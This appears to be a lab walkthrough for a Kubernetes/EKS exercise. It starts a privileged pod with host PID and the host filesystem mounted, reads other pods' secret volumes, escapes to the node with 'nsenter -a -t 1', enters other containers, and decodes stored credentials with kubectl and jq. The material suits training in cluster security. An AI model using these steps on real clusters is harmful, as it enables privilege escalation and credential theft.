# Authentication
To authenticate on the cluster with kubectl:
1. configure AWS credentials in `~/.aws/credentials` (*note*: credentials was
already added to the file)
```
[monitoring]
aws_access_key_id={PLACEHOLDER_K8S_MONITORING_ACCESS_KEY_ID}
aws_secret_access_key={PLACEHOLDER_K8S_MONITORING_ACCESS_KEY_SECRET}
```

2. configure kubectl with AWS credentials:
```shell
aws eks update-kubeconfig --profile=monitoring --name={PLACEHOLDER_K8S_CLUSTER}
```

Ensure you can start privileged pod: `kubectl auth can-i --list`. You should
see a line allowing the user to `use` the PodSecurityPolicy `eks.privileged`.

# From zero to hero

Check the content of `pod.yaml`. It defines a pod with `privileged` access,
which shares the PID namespace and which mount the node whole filesystem on
`/host`

- Start the privileged on the cluster: `kubectl create -f pod.yaml`
- Ensure the pod has been started: `kubectl get pod -n monitoring-app`
- Get an interactive shell: `kubectl exec my-pod -n monitoring-app -it -- /bin/bash`

# Solution 1: browse the node filesystem

Through the node filesystem, you can access the file system of other pods
running on the same host. It includes other pods' mounted volumes and secrets:
```shell
ls /host/var/lib/kubelet/pods/*/volumes
```

Can you find a new AWS secret within? `ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/deployment-secret/`


# Solution 2: escape the container restrictions

With the host PID namespace and privileges, it is very simple to escape all
container isolation:
```shell
nsenter -a -t 1 /bin/bash
```

This command join all Linux namespace (`-a`) of the process with PID 1 (`-t 1`)
and start bash in it.

On Linux, the process with PID 1 is the init program. It runs in all default
namespaces.

You now have a root access within the node EC2 instance. You can also get
access to any other pod running on it:

```shell
docker ps
docker exec -it k8s_core_application-deployment-ds-<RANDOM_ID_TO_COMPLETE> /bin/bash
```

When run within a cluster kubectl automatically use the pod's service account
and the pod's namespace (`aws-app` here).

```shell
kubectl auth can-i --list
kubectl get secret
kubectl get secret application-deployment-credentials -o
kubectl get secret application-deployment-credentials -o json | jq '.data | {description: .description | @base64d, password: .password | @base64d, username: .username | @base64d}'
```

